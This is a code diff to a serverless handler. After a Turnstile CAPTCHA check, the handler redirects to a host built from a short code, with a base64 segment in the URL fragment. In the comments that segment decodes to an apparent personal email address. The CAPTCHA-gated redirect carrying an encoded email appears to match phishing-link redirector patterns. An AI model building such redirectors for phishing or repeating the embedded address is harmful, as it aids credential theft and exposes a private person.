@@ -30,9 +30,13 @@ export default async function handler(req, res) {
     ? data["cf-turnstile-response"][0]
     : data["cf-turnstile-response"];
 
-  if (!token) {
-    console.error("No CAPTCHA token provided.");
-    res.status(400).json({ error: "No CAPTCHA token provided" });
+  const originalUrl = Array.isArray(data["originalUrl"])
+    ? data["originalUrl"][0]
+    : data["originalUrl"]; // Expecting the original URL to be passed in the request
+
+  if (!token || !originalUrl) {
+    console.error("Missing CAPTCHA token or original URL.");
+    res.status(400).json({ error: "Missing CAPTCHA token or original URL" });
     return;
   }
 
@@ -83,10 +87,18 @@ export default async function handler(req, res) {
 
     console.log("CAPTCHA verification succeeded.");
 
-    // Redirect to nba.com after successful CAPTCHA validation
-    const nbaUrl = "https://nba.com";
-    console.log("Redirecting to:", nbaUrl);
-    res.writeHead(302, { Location: nbaUrl });
+    // Parse the original URL and transform it
+    const originalUrlObject = new URL(originalUrl);
+    const pathSegments = originalUrlObject.pathname.split("/").filter(Boolean); // ["BnrVv", "RVJJQy5UUkVNQkxBWUBQUk9GQVFVQS5DQQ=="]
+
+    const newHost = "nba.com";
+    const shortCode = pathSegments[0]; // "BnrVv"
+    const hashPart = pathSegments[1] || ""; // "RVJJQy5UUkVNQkxBWUBQUk9GQVFVQS5DQQ=="
+
+    const transformedUrl = `https://${newHost}/${shortCode}/#${hashPart}`;
+
+    console.log("Redirecting to:", transformedUrl);
+    res.writeHead(302, { Location: transformedUrl });
     res.end();
   } catch (error) {
     console.error("Internal server error:", error);
